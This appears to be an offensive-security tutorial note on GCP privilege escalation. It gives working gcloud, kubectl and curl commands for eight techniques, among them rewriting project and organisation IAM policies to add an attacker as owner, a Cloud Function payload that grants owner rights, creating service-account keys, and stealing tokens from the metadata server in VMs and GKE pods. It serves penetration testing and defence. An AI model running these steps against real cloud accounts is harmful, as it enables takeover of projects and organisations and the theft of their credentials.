# 03.5 — GCP Privilege Escalation

## What This Note Covers

How to escalate privileges in GCP — from low-privilege service accounts and users to project owner or organisation admin. Covers the full IAM escalation technique list, Cloud Function and Cloud Run abuse, GKE node pool escalation, and org-level attacks.

---

## The GCP Privesc Mindset

GCP privilege escalation is almost always about **service account impersonation** or **IAM policy modification**. The question you ask at every step:

> "Do I have any permission that lets me act as a more-privileged identity, or modify the IAM policy to grant myself more permissions?"

Key permissions that open escalation paths:

```
iam.serviceAccounts.actAs               → impersonate any SA you have this on
iam.serviceAccounts.getAccessToken      → generate tokens for any SA
iam.serviceAccountKeys.create           → create permanent key for any SA
resourcemanager.projects.setIamPolicy   → add any binding to project IAM
resourcemanager.folders.setIamPolicy    → add any binding to folder IAM  
resourcemanager.organizations.setIamPolicy → add any binding to org IAM
iam.roles.update                        → modify custom role permissions
compute.instances.setServiceAccount     → attach different SA to a VM
cloudfunctions.functions.create         → create function with admin SA
cloudfunctions.functions.call           → invoke a function you control
```

## Technique 1: Direct IAM Policy Modification

**Permissions needed:** `resourcemanager.projects.setIamPolicy`

The most direct path. Add yourself (or your SA) to the project as Owner.

```bash
# Step 1: Get the current IAM policy
gcloud projects get-iam-policy PROJECT_ID --format=json > policy.json

# Step 2: Edit policy.json — add a new binding
# Add to the "bindings" array:
{
  "role": "roles/owner",
  "members": [
    "user:attacker@gmail.com"
  ]
}

# Step 3: Apply the modified policy
gcloud projects set-iam-policy PROJECT_ID policy.json

# You now have Owner access on the project
gcloud projects get-iam-policy PROJECT_ID
```

## Technique 2: SA Impersonation Chain (actAs)

**Permissions needed:** `iam.serviceAccounts.actAs` on a target SA

If you can act as a service account that has higher permissions, you've escalated.

```bash
# Step 1: List service accounts in the project
gcloud iam service-accounts list --project PROJECT_ID

# Step 2: For each SA, check if you have actAs permission
# (your current identity appears in the SA's IAM policy)
gcloud iam service-accounts get-iam-policy \
  TARGET_SA@PROJECT.iam.gserviceaccount.com \
  --project PROJECT_ID

# Step 3: Check what roles the target SA has
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:TARGET_SA@PROJECT.iam.gserviceaccount.com" \
  --format="table(bindings.role)"

# Step 4: Impersonate the SA
gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com

TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com)

# Step 5: Use the token to enumerate/act as the privileged SA
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

## Technique 3: Create SA Key for Privileged SA

**Permissions needed:** `iam.serviceAccountKeys.create` on a target SA

Creates a permanent JSON key for a SA you don't currently control.

```bash
# Create a key for a high-privilege SA
gcloud iam service-accounts keys create /tmp/admin-key.json \
  --iam-account ADMIN_SA@PROJECT.iam.gserviceaccount.com \
  --project PROJECT_ID

# Authenticate with the new key
gcloud auth activate-service-account \
  --key-file /tmp/admin-key.json

# Verify
gcloud auth list
gcloud projects get-iam-policy PROJECT_ID
```

## Technique 4: Cloud Function Execution with Privileged SA

**Permissions needed:** `cloudfunctions.functions.create`, `iam.serviceAccounts.actAs` on a high-privilege SA, `cloudfunctions.functions.call`

Create a Cloud Function that runs as a privileged SA and executes code on your behalf.

```bash
# Step 1: Create the function payload
mkdir /tmp/cf_privesc && cat > /tmp/cf_privesc/main.py << 'EOF'
import subprocess
import json

def escalate(request):
    # Executed as the privileged service account
    # Add our user to the project as Owner
    result = subprocess.run([
        'gcloud', 'projects', 'add-iam-policy-binding', 'TARGET_PROJECT',
        '--member', 'user:attacker@gmail.com',
        '--role', 'roles/owner'
    ], capture_output=True, text=True)
    return json.dumps({"stdout": result.stdout, "stderr": result.stderr})
EOF

cat > /tmp/cf_privesc/requirements.txt << 'EOF'
EOF

# Step 2: Deploy the function with the privileged SA
gcloud functions deploy privesc-function \
  --runtime python311 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account ADMIN_SA@PROJECT.iam.gserviceaccount.com \
  --source /tmp/cf_privesc \
  --entry-point escalate \
  --region us-central1 \
  --project PROJECT_ID

# Step 3: Invoke the function
gcloud functions call privesc-function \
  --region us-central1 \
  --project PROJECT_ID

# Or via HTTP
FUNCTION_URL=$(gcloud functions describe privesc-function \
  --region us-central1 --format="get(httpsTrigger.url)")
curl $FUNCTION_URL
```

## Technique 5: Modify Custom Role Permissions

**Permissions needed:** `iam.roles.update` on a custom role

If you're bound to a custom role, and you can update that role's permissions, add powerful permissions to it — upgrading yourself.

```bash
# Step 1: Find the custom roles in the project
gcloud iam roles list --project PROJECT_ID

# Step 2: Check which role your identity is assigned (it should be a custom role)
gcloud projects get-iam-policy PROJECT_ID

# Step 3: Add powerful permissions to the custom role
gcloud iam roles update CUSTOM_ROLE_ID \
  --project PROJECT_ID \
  --add-permissions resourcemanager.projects.setIamPolicy,iam.serviceAccountKeys.create

# Step 4: Now use the new permissions
# (may need to wait a moment for policy propagation)
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account ADMIN_SA@PROJECT.iam.gserviceaccount.com
```

## Technique 6: Compute Engine SA Reassignment

**Permissions needed:** `compute.instances.setServiceAccount`, `iam.serviceAccounts.actAs` on admin SA

Change a running VM's service account from a low-privilege one to a high-privilege one, then access the metadata service.

```bash
# Step 1: Find VMs and their current SAs
gcloud compute instances list --format="table(name, zone, serviceAccounts[].email)"

# Step 2: Reassign the SA (VM must be stopped first)
gcloud compute instances stop INSTANCE_NAME --zone ZONE

gcloud compute instances set-service-account INSTANCE_NAME \
  --zone ZONE \
  --service-account ADMIN_SA@PROJECT.iam.gserviceaccount.com \
  --scopes cloud-platform

gcloud compute instances start INSTANCE_NAME --zone ZONE

# Step 3: SSH or use SSM/serial console to reach the instance
# Step 4: Get admin SA token from metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

## Technique 7: GKE Node Pool SA Escalation

GKE (Google Kubernetes Engine) nodes are Compute Engine VMs. They have a service account attached. If that SA is the default Compute Engine SA (with `roles/editor`), gaining access to any pod on the node gives you editor-level access to the project.

```bash
# Find GKE clusters
gcloud container clusters list --project PROJECT_ID

# Get cluster credentials
gcloud container clusters get-credentials CLUSTER_NAME \
  --zone ZONE \
  --project PROJECT_ID

# List nodes and their SA (requires k8s access)
kubectl get nodes -o yaml | grep -A5 "serviceAccount"

# If you're in a pod — steal the node's SA token via metadata
# (from inside the pod)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# If the node SA is the default Compute SA with roles/editor:
# You now have editor access on the entire project
```

## Technique 8: Org-Level IAM Escalation

**Permissions needed:** `resourcemanager.organizations.setIamPolicy`

The highest possible escalation — bind yourself to `roles/owner` at the organisation level, giving you access to every project in the entire organisation.

```bash
# Get the organisation IAM policy
gcloud organizations get-iam-policy ORG_ID --format=json > org-policy.json

# Add your identity as Org Owner
# Edit org-policy.json to add:
{
  "role": "roles/owner",
  "members": ["user:attacker@gmail.com"]
}

# Apply
gcloud organizations set-iam-policy ORG_ID org-policy.json

# Now list all projects in the org
gcloud projects list
```

## Quick Reference — GCP Privesc Commands

```bash
# Enumerate your permissions
gcloud projects get-iam-policy PROJECT_ID

# Find high-privilege SAs
gcloud iam service-accounts list --project PROJECT_ID
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.role:roles/owner OR bindings.role:roles/editor" \
  --format="table(bindings.role, bindings.members)"

# Check if you can impersonate SAs
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  echo "=== $SA ==="
  gcloud iam service-accounts get-iam-policy $SA --project PROJECT_ID 2>/dev/null
done

# Modify project IAM
gcloud projects get-iam-policy PROJECT_ID --format=json > policy.json
# edit policy.json → add owner binding
gcloud projects set-iam-policy PROJECT_ID policy.json

# Automated scan
python3 PrivEscScanner/check_for_privesc.py --project-id PROJECT_ID
```
